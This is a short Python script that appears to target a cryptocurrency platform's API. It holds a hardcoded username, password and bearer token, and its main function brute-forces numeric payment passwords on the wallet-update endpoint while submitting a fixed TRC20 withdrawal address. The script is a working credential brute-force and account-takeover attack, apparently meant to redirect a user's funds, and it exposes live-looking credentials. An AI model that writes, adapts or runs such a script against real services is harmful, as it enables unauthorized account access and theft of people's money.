import requests
import json
import sys

url ="https://api.home.coinadx.com/login" #post
url2= "https://api.home.coinadx.com/index/init" #get
url3= "https://api.home.coinadx.com/user/wallet/info" #get
url4= "https://api.home.coinadx.com/user/wallet/update" #post

data_to_send = {
    "username": "casion",
    "password": "736152",
     "captcha": "ccvw"
}

headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Authorization':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjIxLCJhZG1pbl9pZCI6MSwiaXNzIjoiIiwiYXVkIjoiIiwic3ViIjoiaG9tZSIsImlhdCI6MTcwNjk0OTk3MSwibmJmIjoxNzA2OTQ5OTcxLCJleHAiOjE3MDcwMzYzNzF9.m2kavVq8ywWSeLFx_SUPHszkph2u_6m1LejulltkQQ8'
}

data_to_send_update={
    "address" : "",
    "card_number" : "TT6HYxr8L5sK8Zt12fsA9DWBcZFAKDngw2",
    "icon" : "/static/wallet/trc.png",
    "id" : 12,
    "name" : "TRC20",
    "network" : "trx",
    "payment_id" : 1,
    "payment_password" : "11211",
    "real_name": "USDT",
    "type_name": "TRC20" }


'''try:
    response=requests.post(url4,headers=headers,json=data_to_send_update)
    if response.status_code  == 200:
        print(response.json())
except requests.RequestException as e:
    print("failed",e)'''

def basicBrute(start,end):
    for i  in reversed(range(start,end+1)):
        data_to_send_update={
        "address" : "",
         "card_number" : "TT6HYxr8L5sK8Zt12fsA9DWBcZFAKDngw2",
        "icon" : "/static/wallet/trc.png",
        "id" : 12,
        "name" : "TRC20",
        "network" : "trx",
        "payment_id" : 1,
        "payment_password" : str(i),
        "real_name": "USDT",
        "type_name": "TRC20" 
        }

        try:
            response=requests.post(url4,headers=headers,json=data_to_send_update)
            if response.status_code  == 200:
                print(i,response.json())
                write_to_file("example.txt",str(i)+response.json()['msg']+' '+"\n",True)
                if not response.json()['msg'] == 'Security Key error':
                	sys.exit 
        except requests.RequestException as e:
            print("failed",e)

def write_to_file(file_path, text, append=False):
    mode = 'a' if append else 'w'
    with open(file_path, mode) as file:
        file.write(text)

if __name__=="__main__":
    basicBrute(503221,800000)